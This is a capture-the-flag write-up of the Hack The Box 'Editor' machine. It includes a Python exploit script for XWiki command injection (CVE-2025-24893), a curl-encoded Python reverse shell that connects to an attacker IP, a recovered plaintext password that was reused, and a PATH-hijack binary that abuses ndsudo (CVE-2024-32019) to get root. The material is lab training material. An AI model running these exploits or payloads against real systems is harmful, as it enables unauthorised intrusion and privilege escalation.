<img width="892" height="239" alt="image" src="https://github.com/user-attachments/assets/0b89c17e-2867-4f72-9cdb-9f890c581009" />

```                                                                                                               
┌──(hacking)─(character㉿vbox)-[/tmp/CVE-2021-23017-PoC]
└─$ nmap -sV 10.10.11.80 
sh: 0: getcwd() failed: No such file or directory
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-23 13:34 EST
Nmap scan report for editor.htb (10.10.11.80)
Host is up (0.034s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
8080/tcp open  http    Jetty 10.0.20
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.51 seconds
```

<img width="768" height="277" alt="image" src="https://github.com/user-attachments/assets/5c4df8de-0629-4783-a19c-58bc07999a2f" />


Jetty service is running `XWiki Debian 15.10.8`. This version is vulnerable to cmd injection: `https://www.offsec.com/blog/cve-2025-24893/`
I was able to get the CMD injection to work got chatGPT to make a script for me:

```
#!/usr/bin/env python3
import requests
import sys
import re
from urllib.parse import quote

def execute_command(cmd):
    target = "http://editor.htb:8080"
    endpoint = "/xwiki/bin/get/Main/SolrSearch"
    
    # Construct the Groovy payload - use double quotes for the command
    groovy_payload = f'}}}}}}{{{{async async=false}}}}{{{{groovy}}}}println("{cmd}".execute().text){{{{/groovy}}}}{{{{/async}}}}'
    
    params = {
        "media": "rss",
        "text": groovy_payload
    }
    
    try:
        response = requests.get(target + endpoint, params=params)
        
        match = re.search(r'\[}}}\s*(.*?)\s*\]&lt;/title&gt;', response.text, re.DOTALL)
        
        if match:
            output = match.group(1)
            output = output.replace('&amp;', '&').replace('&lt;', '<').replace('&gt;', '>').replace('&quot;', '"')
            output = re.sub(r'<br\s*/?>', '\n', output)
            output = re.sub(r'</?del>', '', output)
            output = re.sub(r'<[^>]+>', '', output)
            output = output.replace('&nbsp;', ' ')
            return output.strip()
        else:
            return "No output found in response"
                
    except Exception as e:
        return f"Error: {str(e)}"

def interactive_shell():
    print("[+] XWiki RCE Command Execution")
    print("[+] Target: http://editor.htb:8080")
    print("[+] Type 'exit' to quit")
    print("-" * 50)
    
    while True:
        try:
            cmd = input("xwiki@editor.htb $ ").strip()
            
            if cmd.lower() in ['exit', 'quit']:
                print("[+] Exiting...")
                break
            elif cmd == '':
                continue
                
            print(f"[*] Executing: {cmd}")
            output = execute_command(cmd)
            
            if output:
                print(f"[+] Output:\n{output}")
            else:
                print("[-] No output or command failed")
                
        except KeyboardInterrupt:
            print("\n[+] Exiting...")
            break
        except Exception as e:
            print(f"[-] Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        cmd = " ".join(sys.argv[1:])
        output = execute_command(cmd)
        print(output)
    else:
        interactive_shell()
```

<img width="689" height="752" alt="image" src="https://github.com/user-attachments/assets/d2b51954-b027-4074-bd89-4765400c6267" />

```
┌──(character㉿vbox)-[/tmp]
└─$ python3 rce.py
[+] XWiki RCE Command Execution
[+] Target: http://editor.htb:8080
[+] Type 'exit' to quit
--------------------------------------------------
xwiki@editor.htb $ id
[*] Executing: id
[+] Output:
uid=997(xwiki) gid=997(xwiki) groups=997(xwiki)
xwiki@editor.htb $ whoami
[*] Executing: whoami
[+] Output:
xwiki
xwiki@editor.htb $ ls -la
[*] Executing: ls -la
[+] Output:
total 72
drwxr-xr-x  5 root root  4096 Jul 29 11:48 .
drwxr-xr-x 91 root root  4096 Jul 29 11:55 ..
drwxr-xr-x  6 root root  4096 Jul 29 11:48 jetty
lrwxrwxrwx  1 root root    14 Mar 27  2024 logs -> /var/log/xwiki
drwxr-xr-x  2 root root  4096 Jul 29 11:48 start.d
-rw-rr  1 root root  5551 Mar 27  2024 start_xwiki.bat
-rw-rr  1 root root  6223 Mar 27  2024 start_xwiki_debug.bat
-rw-rr  1 root root 10530 Mar 27  2024 start_xwiki_debug.sh
-rw-rr  1 root root  9340 Mar 27  2024 start_xwiki.sh
-rw-rr  1 root root  2486 Mar 27  2024 stop_xwiki.bat
-rw-rr  1 root root  6749 Mar 27  2024 stop_xwiki.sh
drwxr-xr-x  3 root root  4096 Jun 13  2025 webapps
xwiki@editor.htb $ cat /etc/os-release
[*] Executing: cat /etc/os-release
[+] Output:
PRETTY_NAME="Ubuntu 22.04.5 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.5 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy
xwiki@editor.htb $ 
```

Got the revshell with: 
```curl -s "http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7D%5B%22bash%22%2C%20%22-c%22%2C%20%22python3%20-c%20%5C%22import%20socket%2Cos%2Cpty%3Bs%3Dsocket.socket%28%29%3Bs.connect%28%28%5C%5C%5C%2210.10.14.184%5C%5C%5C%22%2C5555%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3Bos.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bpty.spawn%28%5C%5C%5C%22%2Fbin%2Fbash%5C%5C%5C%22%29%5C%22%22%5D.execute%28%29.waitFor%28%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D"```

After some digging, I found:

Username: `xwiki`

password: `theEd1t0rTeam99`


I tried to use this password for `Oliver` and suprisely it worked... (a bit unrealistic but oh well).

This was the user flag.

<img width="585" height="555" alt="image" src="https://github.com/user-attachments/assets/fefdc508-0a33-4f86-93ba-38ed92ab7aab" />


## Root

I ran Linpeas.sh to try and escalate privleges.

I saw that Oliver was in the netdata group. and that the netdata group had SUID Binaries.

<img width="915" height="324" alt="image" src="https://github.com/user-attachments/assets/4024cc2c-1895-426f-848f-ac7640e5d19e" />

Thus, as Oliver because I am in the netdata group, I can run these files and when they run they run as the owner (which is root!)
I also did some recon on the netdata process and there was a privilege escalation CVE (`CVE-2024-32019`). This affects the process `ndsudo`.

<img width="654" height="809" alt="image" src="https://github.com/user-attachments/assets/0b2ae5ef-9b8c-44ed-808d-f04f59dd1161" />

So from this you can see that the ndsudo command is looking for the Executable of the command that you are trying to run. When I ran the `nvme-list` option, it tries to look for the `nvme` in the Path.
This means we can do some PATH Hijacking and place a NVME executable that just does /bin/bash and that should run under root privileges!!

```
#include <unistd.h>
int main() {
    execl("/bin/bash", "/bin/bash", "-p", NULL);
    return 1; // Only reaches here if execl fails
}
```

I compiled this binary and called it nvme (which is the executable ndsudo is looking for). Then, I placed this binary in tmp and set /tmp in my $PATH variable
Boom I got root!

<img width="775" height="186" alt="image" src="https://github.com/user-attachments/assets/bd30f55d-8a14-475c-8ab8-a90447ab83dd" />

